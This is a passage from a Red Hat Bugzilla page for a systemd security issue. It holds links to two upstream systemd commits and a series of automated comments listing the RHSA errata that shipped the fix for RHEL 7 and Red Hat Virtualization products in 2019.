<https://github.com/systemd/systemd/commit/052c57f132f04a3cf4148f87561618da1a6908b4> <https://github.com/systemd/systemd/commit/ef4d6abe7c7fab6cbff975b32e76b09feee56074>   ```  [Comment 25](show_bug.cgi?id=1653861#c25)  errata-xmlrpc    2019-01-14 12:29:42 UTC  ``` This issue has been addressed in the following products:    Red Hat Enterprise Linux 7  Via RHSA-2019:0049 [https://access.redhat.com/errata/RHSA-2019:0049](https://access.redhat.com/errata/RHSA-2019%3A0049)   ```  [Comment 29](show_bug.cgi?id=1653861#c29)  errata-xmlrpc    2019-01-29 16:07:27 UTC  ``` This issue has been addressed in the following products:    Red Hat Enterprise Linux 7.5 Extended Update Support  Via RHSA-2019:0204 [https://access.redhat.com/errata/RHSA-2019:0204](https://access.redhat.com/errata/RHSA-2019%3A0204)   ```  [Comment 30](show_bug.cgi?id=1653861#c30)  errata-xmlrpc    2019-02-04 22:45:10 UTC  ``` This issue has been addressed in the following products:    Red Hat Enterprise Linux 7.4 Extended Update Support  Via RHSA-2019:0271 [https://access.redhat.com/errata/RHSA-2019:0271](https://access.redhat.com/errata/RHSA-2019%3A0271)   ```  [Comment 31](show_bug.cgi?id=1653861#c31)  errata-xmlrpc    2019-02-13 15:33:53 UTC  ``` This issue has been addressed in the following products:    Red Hat Virtualization 4 for Red Hat Enterprise Linux 7  Via RHSA-2019:0342 [https://access.redhat.com/errata/RHSA-2019:0342](https://access.redhat.com/errata/RHSA-2019%3A0342)   ```  [Comment 32](show_bug.cgi?id=1653861#c32)  errata-xmlrpc    2019-02-18 15:25:00 UTC  ``` This issue has been addressed in the following products:    Red Hat Virtualization 4 for Red Hat Enterprise Linux 7  Via RHSA-2019:0361 [https://access.redhat.com/errata/RHSA-2019:0361](https://access.redhat.com/errata/RHSA-2019%3A0361)   ```  [Comment 34](show_bug.cgi?id=1653861#c34)  errata-xmlrpc    2019-08-07 11:36:04 UTC  ``` This issue has been addressed in the following products:    Red Hat Enterprise Linux 7.3 Advanced Update Support   Red Hat Enterprise Linux 7.3 Update Services for SAP Solutions   Red Hat Enterprise Linux 7.3 Telco Extended Update Support  Via RHSA-2019:2402 [https://access.redhat.com/errata/RHSA-2019:2402](https://access.redhat.com/errata/RHSA-2019%3A2402)   ``` |  |
